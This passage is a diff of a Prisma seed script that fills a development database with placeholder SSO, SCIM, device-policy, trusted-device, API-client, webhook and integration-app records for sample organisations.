+        failureReason: 'Meta tag not found on homepage after 5 attempts',
+      },
+      {
+        orgId: enterpriseCo.id,
+        domain: 'enterprise-legacy.net',
+        status: 'EXPIRED',
+        verificationType: 'DNS_TXT',
+        verificationToken: 'gwi-verify=expired789',
+        verifiedAt: new Date(now.getTime() - 400 * 24 * 60 * 60 * 1000),
+        expiresAt: new Date(now.getTime() - 35 * 24 * 60 * 60 * 1000),
+        autoRenew: false,
+      },
+    ]
+  })
+
+  // ==================== ENTERPRISE SSO ====================
+  console.log('🔐 Creating enterprise SSO configurations...')
+
+  await prisma.enterpriseSSO.createMany({
+    data: [
+      {
+        orgId: enterpriseCo.id,
+        provider: 'OKTA',
+        status: 'ACTIVE',
+        config: {
+          issuer: 'https://enterprise-co.okta.com',
+          clientId: 'okta_client_12345',
+          authorizationEndpoint: 'https://enterprise-co.okta.com/oauth2/v1/authorize',
+          tokenEndpoint: 'https://enterprise-co.okta.com/oauth2/v1/token',
+          userInfoEndpoint: 'https://enterprise-co.okta.com/oauth2/v1/userinfo',
+          jwksUri: 'https://enterprise-co.okta.com/oauth2/v1/keys',
+        },
+        attributeMapping: {
+          email: 'email',
+          firstName: 'given_name',
+          lastName: 'family_name',
+          department: 'department',
+          role: 'groups',
+        },
+        defaultRole: 'MEMBER',
+        autoProvision: true,
+        enforceSSO: true,
+        allowedDomains: ['enterprise-co.com', 'enterprise.io'],
+        lastSyncAt: new Date(now.getTime() - 1 * 60 * 60 * 1000),
+        userCount: 127,
+      },
+      {
+        orgId: acmeCorp.id,
+        provider: 'AZURE_AD',
+        status: 'ACTIVE',
+        config: {
+          tenantId: 'acme-tenant-uuid',
+          clientId: 'azure_client_67890',
+          authorizationEndpoint: 'https://login.microsoftonline.com/acme-tenant/oauth2/v2.0/authorize',
+          tokenEndpoint: 'https://login.microsoftonline.com/acme-tenant/oauth2/v2.0/token',
+        },
+        attributeMapping: {
+          email: 'mail',
+          firstName: 'givenName',
+          lastName: 'surname',
+          department: 'department',
+        },
+        defaultRole: 'MEMBER',
+        autoProvision: true,
+        enforceSSO: false,
+        allowedDomains: ['acme.com'],
+        lastSyncAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
+        userCount: 45,
+      },
+      {
+        orgId: enterpriseCo.id,
+        provider: 'SAML',
+        status: 'TESTING',
+        config: {
+          entityId: 'https://gwi.com/saml/enterprise-co',
+          ssoUrl: 'https://idp.enterprise-co.com/saml/sso',
+          certificate: '-----BEGIN CERTIFICATE-----\nMIIC...truncated...==\n-----END CERTIFICATE-----',
+          signatureAlgorithm: 'RSA-SHA256',
+        },
+        attributeMapping: {
+          email: 'urn:oid:0.9.2342.19200300.100.1.3',
+          firstName: 'urn:oid:2.5.4.42',
+          lastName: 'urn:oid:2.5.4.4',
+        },
+        defaultRole: 'VIEWER',
+        autoProvision: false,
+        enforceSSO: false,
+        userCount: 0,
+      },
+      {
+        orgId: techStartup.id,
+        provider: 'GOOGLE',
+        status: 'PENDING_SETUP',
+        config: {
+          clientId: 'google_client_pending',
+        },
+        defaultRole: 'MEMBER',
+        autoProvision: true,
+        enforceSSO: false,
+        allowedDomains: ['techstartup.io'],
+        userCount: 0,
+      },
+    ]
+  })
+
+  // ==================== SCIM INTEGRATIONS ====================
+  console.log('👥 Creating SCIM integrations...')
+
+  await prisma.sCIMIntegration.createMany({
+    data: [
+      {
+        orgId: enterpriseCo.id,
+        provider: 'OKTA',
+        status: 'ACTIVE',
+        endpoint: 'https://api.gwi.com/scim/v2/enterprise-co',
+        bearerToken: 'scim_token_encrypted_abc123',
+        config: {
+          syncUsers: true,
+          syncGroups: true,
+          autoDeactivate: true,
+          syncInterval: 15,
+        },
+        lastSyncAt: new Date(now.getTime() - 15 * 60 * 1000),
+        lastSyncStatus: 'SUCCESS',
+        syncStats: { usersCreated: 5, usersUpdated: 12, usersDeactivated: 2, groupsCreated: 1 },
+        userCount: 127,
+        groupCount: 8,
+      },
+      {
+        orgId: acmeCorp.id,
+        provider: 'AZURE_AD',
+        status: 'ACTIVE',
+        endpoint: 'https://api.gwi.com/scim/v2/acme-corp',
+        bearerToken: 'scim_token_encrypted_def456',
+        config: {
+          syncUsers: true,
+          syncGroups: false,
+          autoDeactivate: true,
+          syncInterval: 30,
+        },
+        lastSyncAt: new Date(now.getTime() - 25 * 60 * 1000),
+        lastSyncStatus: 'SUCCESS',
+        syncStats: { usersCreated: 0, usersUpdated: 3, usersDeactivated: 0 },
+        userCount: 45,
+        groupCount: 0,
+      },
+      {
+        orgId: enterpriseCo.id,
+        provider: 'CUSTOM',
+        status: 'ERROR',
+        endpoint: 'https://api.gwi.com/scim/v2/enterprise-co-legacy',
+        bearerToken: 'scim_token_encrypted_ghi789',
+        config: {
+          syncUsers: true,
+          syncGroups: true,
+          autoDeactivate: false,
+          syncInterval: 60,
+        },
+        lastSyncAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
+        lastSyncStatus: 'FAILED',
+        lastSyncError: 'Connection timeout: Legacy IdP not responding',
+        userCount: 15,
+        groupCount: 2,
+      },
+    ]
+  })
+
+  // ==================== DEVICE POLICIES ====================
+  console.log('📱 Creating device policies...')
+
+  const corpDevicePolicy = await prisma.devicePolicy.create({
+    data: {
+      orgId: enterpriseCo.id,
+      name: 'Enterprise Device Policy',
+      description: 'Standard device requirements for enterprise organization access',
+      isEnabled: true,
+      requirements: {
+        minOSVersions: { windows: '10.0.19041', macos: '12.0', ios: '15.0', android: '12' },
+        requireEncryption: true,
+        requireScreenLock: true,
+        requireBiometric: false,
+        blockJailbroken: true,
+        blockRooted: true,
+        requireMDM: false,
+        allowedDeviceTypes: ['desktop', 'laptop', 'tablet', 'phone'],
+      },
+      maxDevicesPerUser: 5,
+      inactivityTimeout: 30,
+      requireReauthDays: 7,
+    }
+  })
+
+  const strictDevicePolicy = await prisma.devicePolicy.create({
+    data: {
+      orgId: enterpriseCo.id,
+      name: 'High Security Device Policy',
+      description: 'Strict requirements for accessing sensitive data',
+      isEnabled: true,
+      requirements: {
+        minOSVersions: { windows: '11.0', macos: '13.0', ios: '16.0', android: '13' },
+        requireEncryption: true,
+        requireScreenLock: true,
+        requireBiometric: true,
+        blockJailbroken: true,
+        blockRooted: true,
+        requireMDM: true,
+        allowedDeviceTypes: ['desktop', 'laptop'],
+      },
+      maxDevicesPerUser: 2,
+      inactivityTimeout: 15,
+      requireReauthDays: 1,
+    }
+  })
+
+  await prisma.devicePolicy.createMany({
+    data: [
+      {
+        orgId: acmeCorp.id,
+        name: 'Standard Device Policy',
+        description: 'Basic device requirements for Acme Corp',
+        isEnabled: true,
+        requirements: {
+          minOSVersions: { windows: '10.0', macos: '11.0', ios: '14.0', android: '11' },
+          requireEncryption: true,
+          requireScreenLock: true,
+          blockJailbroken: true,
+        },
+        maxDevicesPerUser: 3,
+        inactivityTimeout: 60,
+        requireReauthDays: 14,
+      },
+      {
+        orgId: techStartup.id,
+        name: 'Flexible Device Policy',
+        description: 'Relaxed policy for startup environment',
+        isEnabled: true,
+        requirements: {
+          requireEncryption: false,
+          requireScreenLock: true,
+          blockJailbroken: false,
+        },
+        maxDevicesPerUser: 10,
+        inactivityTimeout: 120,
+        requireReauthDays: 30,
+      },
+    ]
+  })
+
+  // ==================== TRUSTED DEVICES ====================
+  console.log('💻 Creating trusted devices...')
+
+  await prisma.trustedDevice.createMany({
+    data: [
+      {
+        userId: adminUser.id,
+        orgId: acmeCorp.id,
+        deviceId: 'device_admin_macbook_001',
+        deviceName: 'Admin MacBook Pro',
+        deviceType: 'LAPTOP',
+        platform: 'MACOS',
+        osVersion: '14.2.1',
+        browser: 'Chrome 120',
+        fingerprint: 'fp_abc123def456',
+        status: 'TRUSTED',
+        lastUsed: new Date(now.getTime() - 1 * 60 * 60 * 1000),
+        lastIP: '192.168.1.100',
+        lastLocation: 'San Francisco, CA',
+        trustScore: 95,
+        policyId: corpDevicePolicy.id,
+      },
+      {
+        userId: adminUser.id,
+        orgId: acmeCorp.id,
+        deviceId: 'device_admin_iphone_001',
+        deviceName: 'Admin iPhone 15',
+        deviceType: 'PHONE',
+        platform: 'IOS',
+        osVersion: '17.2',
+        fingerprint: 'fp_ghi789jkl012',
+        status: 'TRUSTED',
+        lastUsed: new Date(now.getTime() - 4 * 60 * 60 * 1000),
+        lastIP: '192.168.1.150',
+        lastLocation: 'San Francisco, CA',
+        trustScore: 90,
+      },
+      {
+        userId: johnDoe.id,
+        orgId: acmeCorp.id,
+        deviceId: 'device_john_windows_001',
+        deviceName: 'John Work Desktop',
+        deviceType: 'DESKTOP',
+        platform: 'WINDOWS',
+        osVersion: '11.0.22631',
+        browser: 'Edge 120',
+        fingerprint: 'fp_mno345pqr678',
+        status: 'TRUSTED',
+        lastUsed: new Date(now.getTime() - 2 * 60 * 60 * 1000),
+        lastIP: '192.168.1.110',
+        lastLocation: 'New York, NY',
+        trustScore: 88,
+      },
+      {
+        userId: janeSmith.id,
+        orgId: acmeCorp.id,
+        deviceId: 'device_jane_macbook_001',
+        deviceName: 'Jane MacBook Air',
+        deviceType: 'LAPTOP',
+        platform: 'MACOS',
+        osVersion: '13.6',
+        browser: 'Safari 17',
+        fingerprint: 'fp_stu901vwx234',
+        status: 'TRUSTED',
+        lastUsed: new Date(now.getTime() - 12 * 60 * 60 * 1000),
+        lastIP: '10.0.0.55',
+        lastLocation: 'Boston, MA',
+        trustScore: 85,
+      },
+      {
+        userId: sarahEnterprise.id,
+        orgId: enterpriseCo.id,
+        deviceId: 'device_sarah_thinkpad_001',
+        deviceName: 'Sarah ThinkPad X1',
+        deviceType: 'LAPTOP',
+        platform: 'WINDOWS',
+        osVersion: '11.0.22621',
+        browser: 'Chrome 120',
+        fingerprint: 'fp_yza567bcd890',
+        status: 'TRUSTED',
+        lastUsed: new Date(now.getTime() - 30 * 60 * 1000),
+        lastIP: '172.16.0.50',
+        lastLocation: 'London, UK',
+        trustScore: 92,
+        policyId: corpDevicePolicy.id,
+      },
+      {
+        userId: sarahEnterprise.id,
+        orgId: enterpriseCo.id,
+        deviceId: 'device_sarah_pixel_001',
+        deviceName: 'Sarah Pixel 8',
+        deviceType: 'PHONE',
+        platform: 'ANDROID',
+        osVersion: '14',
+        fingerprint: 'fp_efg123hij456',
+        status: 'PENDING',
+        lastUsed: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
+        lastIP: '185.220.101.50',
+        lastLocation: 'Unknown',
+        trustScore: 45,
+      },
+      {
+        userId: bobWilson.id,
+        orgId: techStartup.id,
+        deviceId: 'device_bob_macmini_001',
+        deviceName: 'Bob Mac Mini',
+        deviceType: 'DESKTOP',
+        platform: 'MACOS',
+        osVersion: '14.1',
+        browser: 'Firefox 121',
+        fingerprint: 'fp_klm789nop012',
+        status: 'TRUSTED',
+        lastUsed: new Date(now.getTime() - 6 * 60 * 60 * 1000),
+        lastIP: '192.168.50.100',
+        lastLocation: 'Austin, TX',
+        trustScore: 82,
+      },
+      {
+        userId: johnDoe.id,
+        orgId: acmeCorp.id,
+        deviceId: 'device_john_ipad_001',
+        deviceName: 'John iPad Pro',
+        deviceType: 'TABLET',
+        platform: 'IOS',
+        osVersion: '17.1',
+        fingerprint: 'fp_qrs345tuv678',
+        status: 'REVOKED',
+        lastUsed: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
+        lastIP: '45.33.32.100',
+        lastLocation: 'Unknown',
+        trustScore: 0,
+        revokedAt: new Date(now.getTime() - 25 * 24 * 60 * 60 * 1000),
+        revokedReason: 'Device reported lost',
+      },
+      {
+        userId: adminUser.id,
+        orgId: acmeCorp.id,
+        deviceId: 'device_admin_linux_001',
+        deviceName: 'Admin Ubuntu Workstation',
+        deviceType: 'DESKTOP',
+        platform: 'LINUX',
+        osVersion: '22.04',
+        browser: 'Chrome 120',
+        fingerprint: 'fp_wxy901zab234',
+        status: 'TRUSTED',
+        lastUsed: new Date(now.getTime() - 48 * 60 * 60 * 1000),
+        lastIP: '192.168.1.200',
+        lastLocation: 'San Francisco, CA',
+        trustScore: 88,
+      },
+      {
+        userId: sarahEnterprise.id,
+        orgId: enterpriseCo.id,
+        deviceId: 'device_sarah_surface_001',
+        deviceName: 'Sarah Surface Pro',
+        deviceType: 'TABLET',
+        platform: 'WINDOWS',
+        osVersion: '11.0.22631',
+        browser: 'Edge 120',
+        fingerprint: 'fp_cde567fgh890',
+        status: 'TRUSTED',
+        lastUsed: new Date(now.getTime() - 8 * 60 * 60 * 1000),
+        lastIP: '172.16.0.75',
+        lastLocation: 'London, UK',
+        trustScore: 90,
+        policyId: strictDevicePolicy.id,
+      },
+    ]
+  })
+
+  // ==================== API CLIENTS ====================
+  console.log('🔌 Creating API clients...')
+
+  await prisma.aPIClient.createMany({
+    data: [
+      {
+        orgId: enterpriseCo.id,
+        name: 'Production Data Pipeline',
+        description: 'Main production API client for data synchronization',
+        clientId: 'client_prod_enterprise_001',
+        clientSecret: 'secret_encrypted_abc123xyz',
+        type: 'CONFIDENTIAL',
+        status: 'ACTIVE',
+        scopes: ['read:audiences', 'write:audiences', 'read:insights', 'read:reports', 'write:exports'],
+        redirectUris: ['https://enterprise-co.com/oauth/callback'],
+        allowedOrigins: ['https://enterprise-co.com', 'https://app.enterprise-co.com'],
+        rateLimitOverride: 2000,
+        lastUsed: new Date(now.getTime() - 5 * 60 * 1000),
+        requestCount: 1456789,
+        createdBy: sarahEnterprise.id,
+      },
+      {
+        orgId: enterpriseCo.id,
+        name: 'Analytics Dashboard',
+        description: 'Internal analytics dashboard integration',
+        clientId: 'client_analytics_enterprise_002',
+        clientSecret: 'secret_encrypted_def456abc',
+        type: 'CONFIDENTIAL',
+        status: 'ACTIVE',
+        scopes: ['read:analytics', 'read:reports', 'read:dashboards'],
+        redirectUris: ['https://analytics.enterprise-co.com/callback'],
+        allowedOrigins: ['https://analytics.enterprise-co.com'],
+        lastUsed: new Date(now.getTime() - 2 * 60 * 60 * 1000),
+        requestCount: 234567,
+        createdBy: sarahEnterprise.id,
+      },
+      {
+        orgId: acmeCorp.id,
+        name: 'Acme Integration Service',
+        description: 'Server-to-server integration for Acme Corp',
+        clientId: 'client_prod_acme_001',
+        clientSecret: 'secret_encrypted_ghi789def',
+        type: 'CONFIDENTIAL',
+        status: 'ACTIVE',
+        scopes: ['read:audiences', 'read:insights', 'write:reports'],
+        rateLimitOverride: 500,
+        lastUsed: new Date(now.getTime() - 30 * 60 * 1000),
+        requestCount: 89234,
+        createdBy: adminUser.id,
+      },
+      {
+        orgId: acmeCorp.id,
+        name: 'Mobile App Client',
+        description: 'Public client for Acme mobile application',
+        clientId: 'client_mobile_acme_002',
+        type: 'PUBLIC',
+        status: 'ACTIVE',
+        scopes: ['read:profile', 'read:dashboards', 'read:reports'],
+        redirectUris: ['acme://oauth/callback', 'https://mobile.acme.com/callback'],
+        lastUsed: new Date(now.getTime() - 4 * 60 * 60 * 1000),
+        requestCount: 45678,
+        createdBy: adminUser.id,
+      },
+      {
+        orgId: techStartup.id,
+        name: 'Startup API Client',
+        description: 'Main API client for Tech Startup',
+        clientId: 'client_prod_startup_001',
+        clientSecret: 'secret_encrypted_jkl012ghi',
+        type: 'CONFIDENTIAL',
+        status: 'ACTIVE',
+        scopes: ['read:audiences', 'read:insights'],
+        lastUsed: new Date(now.getTime() - 12 * 60 * 60 * 1000),
+        requestCount: 12345,
+        createdBy: bobWilson.id,
+      },
+      {
+        orgId: enterpriseCo.id,
+        name: 'Legacy Integration (Deprecated)',
+        description: 'Old integration client - scheduled for removal',
+        clientId: 'client_legacy_enterprise_003',
+        clientSecret: 'secret_encrypted_mno345jkl',
+        type: 'CONFIDENTIAL',
+        status: 'DEPRECATED',
+        scopes: ['read:all'],
+        deprecatedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
+        deprecationReason: 'Migrated to new Production Data Pipeline client',
+        lastUsed: new Date(now.getTime() - 45 * 24 * 60 * 60 * 1000),
+        requestCount: 567890,
+        createdBy: sarahEnterprise.id,
+      },
+      {
+        orgId: acmeCorp.id,
+        name: 'Testing Client',
+        description: 'Client for staging and testing environments',
+        clientId: 'client_test_acme_003',
+        clientSecret: 'secret_encrypted_pqr678mno',
+        type: 'CONFIDENTIAL',
+        status: 'ACTIVE',
+        scopes: ['read:*', 'write:*'],
+        allowedOrigins: ['http://localhost:3000', 'https://staging.acme.com'],
+        ipWhitelist: ['192.168.1.0/24', '10.0.0.0/8'],
+        lastUsed: new Date(now.getTime() - 6 * 60 * 60 * 1000),
+        requestCount: 5678,
+        createdBy: johnDoe.id,
+      },
+      {
+        orgId: enterpriseCo.id,
+        name: 'Webhook Processor',
+        description: 'Service account for webhook processing',
+        clientId: 'client_webhook_enterprise_004',
+        clientSecret: 'secret_encrypted_stu901pqr',
+        type: 'SERVICE_ACCOUNT',
+        status: 'ACTIVE',
+        scopes: ['webhooks:send', 'events:read'],
+        lastUsed: new Date(now.getTime() - 1 * 60 * 1000),
+        requestCount: 2345678,
+        createdBy: sarahEnterprise.id,
+      },
+    ]
+  })
+
+  // ==================== WEBHOOK ENDPOINTS ====================
+  console.log('🔗 Creating webhook endpoints...')
+
+  const webhook1 = await prisma.webhookEndpoint.create({
+    data: {
+      orgId: enterpriseCo.id,
+      name: 'Slack Notifications',
+      url: 'https://hooks.slack.com/services/T00/B00/XXXX',
+      status: 'ACTIVE',
+      events: ['report.completed', 'insight.generated', 'export.ready'],
+      secret: 'whsec_enterprise_slack_abc123',
+      version: 'v1',
+      headers: { 'X-Custom-Header': 'enterprise-webhook' },
+      retryPolicy: { maxRetries: 3, backoffMultiplier: 2 },
+      successRate: 99.2,
+      totalDeliveries: 15678,
+      lastDeliveryAt: new Date(now.getTime() - 30 * 60 * 1000),
+      createdBy: sarahEnterprise.id,
+    }
+  })
+
+  const webhook2 = await prisma.webhookEndpoint.create({
+    data: {
+      orgId: enterpriseCo.id,
+      name: 'Data Pipeline Trigger',
+      url: 'https://pipeline.enterprise-co.com/webhooks/gwi',
+      status: 'ACTIVE',
+      events: ['audience.updated', 'datasource.synced', 'agent.completed'],
+      secret: 'whsec_enterprise_pipeline_def456',
+      version: 'v1',
+      retryPolicy: { maxRetries: 5, backoffMultiplier: 2 },
+      successRate: 98.5,
+      totalDeliveries: 45678,
+      lastDeliveryAt: new Date(now.getTime() - 15 * 60 * 1000),
+      createdBy: sarahEnterprise.id,
+    }
+  })
+
+  const webhook3 = await prisma.webhookEndpoint.create({
+    data: {
+      orgId: acmeCorp.id,
+      name: 'Internal Event Handler',
+      url: 'https://api.acme.com/webhooks/gwi-events',
+      status: 'ACTIVE',
+      events: ['*'],
+      secret: 'whsec_acme_events_ghi789',
+      version: 'v1',
+      successRate: 97.8,
+      totalDeliveries: 23456,
+      lastDeliveryAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
+      createdBy: adminUser.id,
+    }
+  })
+
+  const webhook4 = await prisma.webhookEndpoint.create({
+    data: {
+      orgId: acmeCorp.id,
+      name: 'Zapier Integration',
+      url: 'https://hooks.zapier.com/hooks/catch/12345/abcdef/',
+      status: 'ACTIVE',
+      events: ['report.completed', 'export.ready'],
+      secret: 'whsec_acme_zapier_jkl012',
+      version: 'v1',
+      successRate: 99.9,
+      totalDeliveries: 5678,
+      lastDeliveryAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
+      createdBy: janeSmith.id,
+    }
+  })
+
+  const webhook5 = await prisma.webhookEndpoint.create({
+    data: {
+      orgId: techStartup.id,
+      name: 'Analytics Processor',
+      url: 'https://analytics.techstartup.io/webhook',
+      status: 'FAILING',
+      events: ['insight.generated', 'agent.completed'],
+      secret: 'whsec_startup_analytics_mno345',
+      version: 'v1',
+      successRate: 45.2,
+      totalDeliveries: 890,
+      lastDeliveryAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
+      lastError: 'Connection refused: ECONNREFUSED',
+      lastErrorAt: new Date(now.getTime() - 30 * 60 * 1000),
+      createdBy: bobWilson.id,
+    }
+  })
+
+  await prisma.webhookEndpoint.createMany({
+    data: [
+      {
+        orgId: enterpriseCo.id,
+        name: 'Security Alerts',
+        url: 'https://siem.enterprise-co.com/api/gwi-alerts',
+        status: 'ACTIVE',
+        events: ['security.violation', 'user.suspicious_activity'],
+        secret: 'whsec_enterprise_security_pqr678',
+        version: 'v1',
+        successRate: 100,
+        totalDeliveries: 234,
+        createdBy: sarahEnterprise.id,
+      },
+      {
+        orgId: acmeCorp.id,
+        name: 'Disabled Legacy Webhook',
+        url: 'https://old-api.acme.com/webhook',
+        status: 'DISABLED',
+        events: ['report.completed'],
+        secret: 'whsec_acme_legacy_stu901',
+        version: 'v1',
+        totalDeliveries: 12345,
+        disabledAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
+        disabledReason: 'Endpoint deprecated - migrated to new system',
+        createdBy: adminUser.id,
+      },
+    ]
+  })
+
+  // ==================== WEBHOOK DELIVERIES ====================
+  console.log('📬 Creating webhook deliveries...')
+
+  await prisma.webhookDelivery.createMany({
+    data: [
+      { webhookId: webhook1.id, eventType: 'report.completed', status: 'DELIVERED', requestBody: { reportId: 'rpt_001', name: 'Q4 Analysis' }, responseStatus: 200, responseBody: { ok: true }, latencyMs: 145, attemptNumber: 1, deliveredAt: new Date(now.getTime() - 30 * 60 * 1000) },
+      { webhookId: webhook1.id, eventType: 'insight.generated', status: 'DELIVERED', requestBody: { insightId: 'ins_001', type: 'trend' }, responseStatus: 200, responseBody: { ok: true }, latencyMs: 98, attemptNumber: 1, deliveredAt: new Date(now.getTime() - 2 * 60 * 60 * 1000) },
+      { webhookId: webhook2.id, eventType: 'audience.updated', status: 'DELIVERED', requestBody: { audienceId: 'aud_001', changes: ['criteria'] }, responseStatus: 200, latencyMs: 234, attemptNumber: 1, deliveredAt: new Date(now.getTime() - 15 * 60 * 1000) },
+      { webhookId: webhook2.id, eventType: 'agent.completed', status: 'DELIVERED', requestBody: { agentId: 'agent_001', status: 'success' }, responseStatus: 200, latencyMs: 189, attemptNumber: 1, deliveredAt: new Date(now.getTime() - 1 * 60 * 60 * 1000) },
+      { webhookId: webhook3.id, eventType: 'export.ready', status: 'DELIVERED', requestBody: { exportId: 'exp_001', url: 'https://...' }, responseStatus: 200, latencyMs: 312, attemptNumber: 1, deliveredAt: new Date(now.getTime() - 2 * 60 * 60 * 1000) },
+      { webhookId: webhook3.id, eventType: 'report.completed', status: 'FAILED', requestBody: { reportId: 'rpt_002' }, responseStatus: 500, responseBody: { error: 'Internal server error' }, latencyMs: 5000, attemptNumber: 3, error: 'Max retries exceeded', nextRetryAt: null },
+      { webhookId: webhook4.id, eventType: 'report.completed', status: 'DELIVERED', requestBody: { reportId: 'rpt_003' }, responseStatus: 200, latencyMs: 456, attemptNumber: 1, deliveredAt: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
+      { webhookId: webhook5.id, eventType: 'insight.generated', status: 'FAILED', requestBody: { insightId: 'ins_002' }, latencyMs: 30000, attemptNumber: 3, error: 'Connection refused: ECONNREFUSED' },
+      { webhookId: webhook5.id, eventType: 'agent.completed', status: 'PENDING', requestBody: { agentId: 'agent_002' }, attemptNumber: 1, nextRetryAt: new Date(now.getTime() + 5 * 60 * 1000) },
+      { webhookId: webhook1.id, eventType: 'export.ready', status: 'DELIVERED', requestBody: { exportId: 'exp_002' }, responseStatus: 200, latencyMs: 167, attemptNumber: 1, deliveredAt: new Date(now.getTime() - 45 * 60 * 1000) },
+    ]
+  })
+
+  // ==================== INTEGRATION APPS ====================
+  console.log('🧩 Creating integration apps...')
+
+  const slackApp = await prisma.integrationApp.create({
+    data: {
+      name: 'Slack',
+      slug: 'slack',
+      description: 'Send insights and reports directly to Slack channels. Get real-time notifications for important events.',
+      shortDescription: 'Team communication and notifications',
+      category: 'COMMUNICATION',
+      developer: 'GWI',
+      developerUrl: 'https://gwi.com',
+      logoUrl: 'https://cdn.gwi.com/integrations/slack-logo.png',
+      status: 'PUBLISHED',
+      version: '2.1.0',
+      features: ['Real-time notifications', 'Channel integration', 'Slash commands', 'Interactive messages'],
+      permissions: ['read:reports', 'read:insights', 'webhooks:send'],
+      setupInstructions: 'Click Install and authorize GWI to access your Slack workspace.',
+      documentationUrl: 'https://docs.gwi.com/integrations/slack',
+      supportUrl: 'https://support.gwi.com/slack',
+      isOfficial: true,
+      installCount: 456,
+      rating: 4.8,
+      reviewCount: 89,
+    }
+  })
+
+  const salesforceApp = await prisma.integrationApp.create({
+    data: {
+      name: 'Salesforce',
+      slug: 'salesforce',
+      description: 'Sync audience insights with Salesforce CRM. Enrich customer profiles with GWI data.',
+      shortDescription: 'CRM integration and data sync',
+      category: 'CRM',
+      developer: 'GWI',
+      developerUrl: 'https://gwi.com',
+      logoUrl: 'https://cdn.gwi.com/integrations/salesforce-logo.png',
+      status: 'PUBLISHED',
+      version: '1.5.0',
+      features: ['Contact enrichment', 'Custom field mapping', 'Bi-directional sync', 'Automated workflows'],
+      permissions: ['read:audiences', 'read:insights', 'write:exports'],
+      documentationUrl: 'https://docs.gwi.com/integrations/salesforce',
+      isOfficial: true,
+      installCount: 234,
+      rating: 4.5,
+      reviewCount: 45,
+    }
+  })
+
+  const tableauApp = await prisma.integrationApp.create({
+    data: {
+      name: 'Tableau',
+      slug: 'tableau',
+      description: 'Connect GWI data to Tableau for advanced visualization and business intelligence.',
+      shortDescription: 'Data visualization connector',
+      category: 'ANALYTICS',
+      developer: 'GWI',
+      developerUrl: 'https://gwi.com',
+      logoUrl: 'https://cdn.gwi.com/integrations/tableau-logo.png',
+      status: 'PUBLISHED',
+      version: '1.2.0',
+      features: ['Web Data Connector', 'Live data connection', 'Custom extracts', 'Dashboard embedding'],
+      permissions: ['read:audiences', 'read:crosstabs', 'read:analytics'],
+      documentationUrl: 'https://docs.gwi.com/integrations/tableau',
+      isOfficial: true,
+      installCount: 178,
+      rating: 4.6,
+      reviewCount: 34,
+    }
+  })
+
+  await prisma.integrationApp.createMany({
+    data: [
+      {
+        name: 'Microsoft Teams',
+        slug: 'microsoft-teams',
+        description: 'Integrate GWI with Microsoft Teams for seamless collaboration and notifications.',
+        shortDescription: 'Team collaboration and alerts',
+        category: 'COMMUNICATION',
+        developer: 'GWI',
+        logoUrl: 'https://cdn.gwi.com/integrations/teams-logo.png',
+        status: 'PUBLISHED',
+        version: '1.0.0',
+        features: ['Channel notifications', 'Adaptive cards', 'Bot commands'],
+        permissions: ['read:reports', 'webhooks:send'],
+        isOfficial: true,
+        installCount: 123,
+        rating: 4.3,
+        reviewCount: 18,
+      },
+      {
+        name: 'HubSpot',
+        slug: 'hubspot',
+        description: 'Sync GWI audience data with HubSpot for enriched marketing campaigns.',
+        shortDescription: 'Marketing automation sync',
+        category: 'CRM',
+        developer: 'GWI',
+        logoUrl: 'https://cdn.gwi.com/integrations/hubspot-logo.png',
+        status: 'PUBLISHED',
+        version: '1.3.0',
+        features: ['Contact enrichment', 'List sync', 'Custom properties'],
+        permissions: ['read:audiences', 'write:exports'],
+        isOfficial: true,
+        installCount: 167,
+        rating: 4.4,
+        reviewCount: 28,
+      },
+      {
+        name: 'Google BigQuery',
+        slug: 'google-bigquery',
+        description: 'Export GWI data directly to Google BigQuery for advanced analytics.',
+        shortDescription: 'Data warehouse export',
+        category: 'DATA_WAREHOUSE',
+        developer: 'GWI',
+        logoUrl: 'https://cdn.gwi.com/integrations/bigquery-logo.png',
+        status: 'PUBLISHED',
+        version: '2.0.0',
+        features: ['Scheduled exports', 'Custom schemas', 'Incremental sync'],
+        permissions: ['read:*', 'write:exports'],
+        isOfficial: true,
+        installCount: 89,
+        rating: 4.7,
+        reviewCount: 15,
+      },
+      {
+        name: 'Snowflake',
+        slug: 'snowflake',
+        description: 'Connect GWI to Snowflake for enterprise data warehousing.',
+        shortDescription: 'Cloud data warehouse',
+        category: 'DATA_WAREHOUSE',
+        developer: 'GWI',
+        logoUrl: 'https://cdn.gwi.com/integrations/snowflake-logo.png',
+        status: 'PUBLISHED',
+        version: '1.1.0',
+        features: ['Data sharing', 'Secure views', 'Real-time sync'],
+        permissions: ['read:*', 'write:exports'],
+        isOfficial: true,
+        installCount: 67,
+        rating: 4.8,
+        reviewCount: 12,
+      },
+      {
+        name: 'Zapier',
+        slug: 'zapier',
+        description: 'Connect GWI to 5000+ apps through Zapier automation.',
+        shortDescription: 'Workflow automation',
+        category: 'AUTOMATION',
+        developer: 'GWI',
+        logoUrl: 'https://cdn.gwi.com/integrations/zapier-logo.png',
+        status: 'PUBLISHED',
+        version: '1.4.0',
+        features: ['Triggers', 'Actions', 'Multi-step Zaps'],
+        permissions: ['read:reports', 'read:exports', 'webhooks:receive'],
+        isOfficial: true,
+        installCount: 345,
+        rating: 4.5,
+        reviewCount: 67,
+      },
+      {
+        name: 'Power BI',
+        slug: 'power-bi',
+        description: 'Microsoft Power BI connector for GWI data visualization.',
+        shortDescription: 'Business intelligence',
+        category: 'ANALYTICS',
+        developer: 'GWI',
+        logoUrl: 'https://cdn.gwi.com/integrations/powerbi-logo.png',
+        status: 'PUBLISHED',
+        version: '1.0.0',
+        features: ['DirectQuery', 'Scheduled refresh', 'Custom visuals'],
+        permissions: ['read:audiences', 'read:crosstabs'],
+        isOfficial: true,
+        installCount: 145,
+        rating: 4.4,
+        reviewCount: 23,
+      },
+      {
+        name: 'Marketo',
+        slug: 'marketo',
+        description: 'Enrich Marketo leads with GWI audience insights.',
+        shortDescription: 'Marketing automation',
+        category: 'CRM',
+        developer: 'Partner Solutions Inc',
+        developerUrl: 'https://partnersolutions.com',
+        logoUrl: 'https://cdn.gwi.com/integrations/marketo-logo.png',
+        status: 'PUBLISHED',
+        version: '0.9.0',
+        features: ['Lead enrichment', 'Segment sync'],
+        permissions: ['read:audiences'],
+        isOfficial: false,
